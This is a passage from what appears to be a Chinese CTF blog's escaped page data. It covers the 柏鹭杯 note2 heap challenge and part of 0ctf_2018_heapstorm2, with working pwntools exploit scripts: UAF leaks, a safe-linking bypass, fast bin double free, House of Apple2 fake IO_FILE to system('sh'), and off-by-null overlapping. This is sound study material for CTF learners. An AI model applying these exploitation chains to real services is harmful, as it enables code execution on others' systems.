class=\"line\"><span class=\"comment\"># 7==9, write 9 by 7</span></span><br><span class=\"line\">payload=p64(IO_list_addr^(heapbase&gt;&gt;<span class=\"number\">12</span>)) <span class=\"comment\"># bypass safe-linking (after glibc2.32)</span></span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x70</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_wfile_jumps=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">target_addr=heapbase+<span class=\"number\">0xfc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_fp=<span class=\"string\">b&#x27;  sh&#x27;</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0xe0</span>) <span class=\"comment\"># -&gt;wide_data</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(_IO_wfile_jumps)</span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xe0</span>+<span class=\"number\">0xe0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0x210</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide=<span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">fake_wide=fake_wide.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(sys_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x200</span>,fake_fp) <span class=\"comment\"># +0xfc0</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x200</span>,fake_wide) <span class=\"comment\"># +0x11c0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite _IO_list_all</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x70</span>,p64(heapbase+<span class=\"number\">0xfc0</span>))  </span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;IO_list_addr&#x27;</span>,<span class=\"built_in\">hex</span>(IO_list_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>,<span class=\"built_in\">hex</span>(_IO_wfile_jumps))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">debug()</span><br><span class=\"line\"></span><br><span class=\"line\">exit_pwn()</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>柏鹭杯的note2，用的glibc2.35。</p>\n<p>高版本的 glibc 封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。这些高版本的glibc利用往往涉及到io(House of …)，而且不少都与large bin有关系，但这里走的是fast bin和tcache。</p>","more":"<p>堆题经典保护全开。glibc2.35的ld文件用的是ld-linux-x86-64.so.2而不是ld-2.35.so</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高版本libc用ld-linux-x86-64.so.2，除此之外还要</span></span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/</span><br></pre></td></tr></table></figure>\n\n<p>这也是一个菜单，有增删查的功能；最多同时申请10个chunk，chunk的size&lt;=0x200（small bin）；在删除的时候没有清空指针，存在UAF；查是简单的puts()；程序退出的时候走的是exit(0)。</p>\n<p>可以通过UAF+查leak libc，通过fast bin double free劫持_IO_list_all，之后走House of Apple2的利用链。</p>\n<h3 id=\"leak-libc-and-heap-base\"><a href=\"#leak-libc-and-heap-base\" class=\"headerlink\" title=\"leak libc and heap base\"></a>leak libc and heap base</h3><p>利用unsorted bin和UAF来leak libc</p>\n<p>heap base可以通过让两个chunk在unsorted bin中利用UAF来leak</p>\n<p>heap base也可以利用<strong>glibc2.32引入tcache的safe-linking（异或加密）机制</strong>来leak，该操作在chunk被放入tcache bin和从tcache bin中取出时进行，会对<strong>存放在<code>fd</code>处的指针</strong>进行处理。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROTECT_PTR(pos, ptr, type)  \\</span></span><br><span class=\"line\"><span class=\"meta\">        ((type)((((size_t)pos) &gt;&gt; PAGE_SHIFT) ^ ((size_t)ptr)))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REVEAL_PTR(pos, ptr, type)   \\</span></span><br><span class=\"line\"><span class=\"meta\">        PROTECT_PTR(pos, ptr, type)</span></span><br></pre></td></tr></table></figure>\n\n<p>实际上就是执行<code>ptr^(heap_base&gt;&gt;12)</code>。因此第一个放入tcache的chunk中的fd=(0^(heap_base&gt;&gt;12))==(heap_base&gt;&gt;12)，因此只要读出其中的值，并左移12位即可得到heap_base。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key=uu64(r(<span class=\"number\">5</span>)) <span class=\"comment\"># heap_base长6字节,最后12位为0,右移12位后,接受5字节即可获得高36bit和额外的4bit</span></span><br><span class=\"line\">heap_base=key&lt;&lt;<span class=\"number\">12</span> <span class=\"comment\"># 此时左移12bit即可得到heap_base</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"djack-IO-list-all\"><a href=\"#djack-IO-list-all\" class=\"headerlink\" title=\"djack _IO_list_all\"></a>djack _IO_list_all</h3><p>这里要利用UAF控制unsorted bin或small bin并不容易，最方便的还是利用fast bin double free实现overlap，修改fd指向<code>_IO_list_all</code>，并且由于使用tcache，在tcache为空的情况下会先从fast bin放入tcache，再从tcache中取出，不会对<code>size</code>字段进行检查，因此不用调整偏移满足<code>size</code>字段。</p>\n<h3 id=\"House-of-Apple2\"><a href=\"#House-of-Apple2\" class=\"headerlink\" title=\"House of Apple2\"></a>House of Apple2</h3><p>伪造<code>IO_FILE</code>，利用House of Apple2，走<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_wfile_overflow(_IO_wfile_jumps中的_IO_overflow)-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">target_addr=heapbase+<span class=\"number\">0xfc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_fp=<span class=\"string\">b&#x27;  sh&#x27;</span> <span class=\"comment\"># flag &lt;-target </span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_ptr &gt; write_base</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0xe0</span>) <span class=\"comment\"># -&gt;wide_data</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(_IO_wfile_jumps) <span class=\"comment\"># mode&lt;=0 -&gt;vtable</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xe0</span>+<span class=\"number\">0xe0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0x210</span>) <span class=\"comment\"># -&gt;wide_data-&gt;vtable</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide=<span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">fake_wide=fake_wide.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(sys_addr) <span class=\"comment\"># fp-&gt;_wide_data-&gt;_wide_vtable + 0x68=RIP</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x200</span>,fake_fp) <span class=\"comment\"># +0xfc0</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x200</span>,fake_wide) <span class=\"comment\"># +0x11c0</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Enter content: &#x27;</span>)</span><br><span class=\"line\">  sl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">view</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index?\\n&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exit_pwn</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc and heap base</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x110</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>*<span class=\"number\">0x6</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">7</span>):</span><br><span class=\"line\">  free(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\"># 1-6 and 8 in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># 0 and 7 leak</span></span><br><span class=\"line\"><span class=\"comment\"># unsorted head -&gt; 0 -&gt; 7</span></span><br><span class=\"line\">view(<span class=\"number\">7</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>])-<span class=\"number\">0x219ce0</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">view(<span class=\"number\">0</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>])-<span class=\"number\">0xa70</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fast bin double free</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  free(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"comment\"># double free</span></span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  add(<span class=\"built_in\">str</span>(i),<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;g&#x27;</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">IO_list_addr=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\"># 7==9, write 9 by 7</span></span><br><span class=\"line\">payload=p64(IO_list_addr^(heapbase&gt;&gt;<span class=\"number\">12</span>)) <span class=\"comment\"># bypass safe-linking (after glibc2.32)</span></span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x70</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x70</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_wfile_jumps=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">target_addr=heapbase+<span class=\"number\">0xfc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_fp=<span class=\"string\">b&#x27;  sh&#x27;</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0xe0</span>) <span class=\"comment\"># -&gt;wide_data</span></span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(_IO_wfile_jumps)</span><br><span class=\"line\">fake_fp=fake_fp.ljust(<span class=\"number\">0xe0</span>+<span class=\"number\">0xe0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(target_addr+<span class=\"number\">0x210</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide=<span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">fake_wide=fake_wide.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(sys_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x200</span>,fake_fp) <span class=\"comment\"># +0xfc0</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x200</span>,fake_wide) <span class=\"comment\"># +0x11c0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite _IO_list_all</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x70</span>,p64(heapbase+<span class=\"number\">0xfc0</span>))  </span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;IO_list_addr&#x27;</span>,<span class=\"built_in\">hex</span>(IO_list_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>,<span class=\"built_in\">hex</span>(_IO_wfile_jumps))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">debug()</span><br><span class=\"line\"></span><br><span class=\"line\">exit_pwn()</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"0ctf_2018_heapstorm2","date":"2023-01-02T11:54:26.000Z","_content":"House of Storm例题\n<!-- more -->\n64位堆题，保护全开，libc 2.23。\n\n一个菜单，有增删查改功能。\n\n程序开始时会禁用，初始化heap_array。\n\n```c\nstruct heapchunk\n{\n    unsigned long size ^ r1;\n    unsigned long chunk ^ r2;\n};\n\nstruct heaparray\n{\n    unsigned long r1,r2,r3,r4;//四个随机数，其中r3==r4\n    struct heapchunk heap_chunk[16];\n} heap_array;\n\n```\n\nadd功能中最多同时存在16个chunk并且会使用calloc，对chunk中内容清空。\n\ndelete功能中会检测idx和size是否正确，free后会清空指针和size。\n\nedit功能中存在off by one漏洞。写入数据大小必须**小于size-0x12**，并且会在写入的content后面加上一个12字节的字符串，同时会**多写一个'\\x00'**。因此这里直接利用edit控制pre_size是不可行的。\n\nshow功能开始的时候会对heaparray的r3和r4进行xor，只有结果`==0x13377331`才能show，然而``r3==r4`，xor的结果会是0。这让我们能够**控制heaparray才能show**。\n\n首先我们通过off by null减小size，再利用前向合并(unlink)来实现overlapping，控制两个chunk用于house of storm。\n\n```python\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\nadd(0x18)#6\n\n\npayload='a'*0x4f0+p64(0x500)\nedit(1,payload)#首先在chunk1+0x4f0写入0x500，作为之后的pre_size\nfree(1)#释放chunk1，这会写入chunk2的pre_size(0x510)和pre_inuse(0)\n\npayload='a'*(0x18-12)\nedit(0,payload)#通过off by null修改chunk1的size(0x511=>0x500)\n\n#这里将0x500的内容申请出来，chunk7后面用来overlapping\nadd(0x18)#1\nadd(0x4d8)#7\n\nfree(1)#绕过unlink的检查（合并的时候会用unlink去取chunk）\nfree(2)#释放chunk2后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk1的0x510)\n#由此实现overlapping，chunk7->heapbase+0x50，能写入0x4d8(实际上只要能控制前0x20即可)\n\nadd(0x38)#1\nadd(0x4e8)#2 overlapping，可以被chunk7控制，size为0x4f0\n\n#故技重施\npayload='a'*0x4f0+p64(0x500)\nedit(4,payload)#在chunk4+0x4f0写入0x500，作为之后的pre_size\nfree(4)#释放chunk4，这会写入chunk5的pre_size(0x510)和pre_inuse(0)\n\npayload='a'*(0x18-12)\nedit(3,payload)#通过off by null修改chunk4的size(0x511=>0x500)\n\n#这里将0x500的内容申请出来，chunk8后面用来overlapping\nadd(0x18)#4\nadd(0x4d8)#8 \n\nfree(4)#绕过unlink的检查（合并的时候会用unlink去取chunk）\nfree(5)#释放chunk5后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk4的0x510)\n#由此实现overlapping，chunk8->heapbase+0x5a0，能写入0x4d8\n\nadd(0x48)#4 从unsorted bin中切割，余下0x4e0大小的chunk(被chunk8控制)在unsorted 